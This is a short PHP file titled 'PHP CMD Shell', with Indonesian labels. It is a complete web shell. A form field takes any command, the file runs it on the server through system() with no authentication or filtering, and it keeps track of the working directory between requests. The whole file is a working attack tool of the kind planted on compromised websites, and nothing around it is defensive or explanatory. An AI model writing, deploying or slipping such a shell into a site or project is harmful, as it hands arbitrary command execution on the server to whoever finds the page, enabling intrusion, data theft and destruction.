<?php
session_start();

$cmd_output = "";
$cmd_value = "";
$cwd = isset($_SESSION['cwd']) ? $_SESSION['cwd'] : getcwd(); 

if (isset($_POST['cmd'])) {
    $cmd_value = trim($_POST['cmd']);

    if (preg_match('/^cd\s+(.*)$/', $cmd_value, $matches)) {
        $path = $matches[1];
        if ($path === "..") {
            $cwd = dirname($cwd); 
        } elseif ($path === "~") {
            $cwd = getenv("HOME") ?: $cwd; 
        } else {
            $new_path = realpath($cwd . DIRECTORY_SEPARATOR . $path);
            if ($new_path && is_dir($new_path)) {
                $cwd = $new_path;
            } else {
                $cmd_output = "Direktori tidak ditemukan: $path";
            }
        }
    } else {
     
        ob_start();
        chdir($cwd); 
        system($cmd_value);
        $cmd_output = ob_get_clean();
    }

    $_SESSION['cwd'] = $cwd; 
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP CMD Shell</title>
</head>
<body>
    <h2>PHP CMD Shell</h2>
    <p><strong>Direktori Saat Ini:</strong> <?php echo htmlspecialchars($cwd, ENT_QUOTES, 'UTF-8'); ?></p>
    <form method="post">
        <input type="text" name="cmd" placeholder="Masukkan perintah" required value="<?php echo htmlspecialchars($cmd_value, ENT_QUOTES, 'UTF-8'); ?>">
        <button type="submit">Jalankan</button>
    </form>

    <?php if (!empty($cmd_output)): ?>
        <h3>Output:</h3>
        <pre><?php echo htmlspecialchars($cmd_output, ENT_QUOTES, 'UTF-8'); ?></pre>
    <?php endif; ?>
</body>
</html>
